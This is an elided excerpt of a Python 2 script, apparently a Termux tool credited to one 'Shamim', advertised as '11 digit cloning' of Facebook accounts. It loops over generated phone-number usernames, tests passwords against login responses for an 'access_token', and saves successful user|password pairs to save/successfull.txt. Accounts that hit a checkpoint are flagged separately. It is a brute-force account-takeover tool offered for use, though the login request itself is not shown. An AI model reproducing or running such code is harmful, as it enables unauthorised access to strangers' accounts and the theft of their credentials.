...
os.system('clear')
psb('\x1b[1;32mBANGLADESH SHAMIM  11 DIGIT CLONING START PLEASE WAIT ..........')
for n in range(9999):
...
logo = '\n|.d8888. db   db  .d8b.  .88b  d88. d888888b .88b  d88. \n|88'  YP 88   88 d8' `8b 88'YbdP`88   `88'   88'YbdP`88\n|`8bo.   88ooo88 88ooo88 88  88  88    88    88  88  88\n|`Y8b. 88~~~88 88~~~88 88  88  88    88    88  88  88\n|db   8D 88   88 88   88 88  88  88   .88.   88  88  88\n|`8888Y' YP   YP YP   YP YP  YP  YP Y888888P YP  YP  YP'
...
def menu():
    ...
    print ''
    print 'AUTHOR   : SHAMIM  '
    print 'FACEBOOK : Shamim Hossen '
    print 'GITHUB     : github.com/Termux-Shamim'
    print ''
    print 50* '-'
    print '[1]  \x1b[1;96mGP'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[SHAMIM-OKY]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[SHAMIM-CP]\x1b[1;97m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m[Open After 03 Days]\x1b[0m \n'
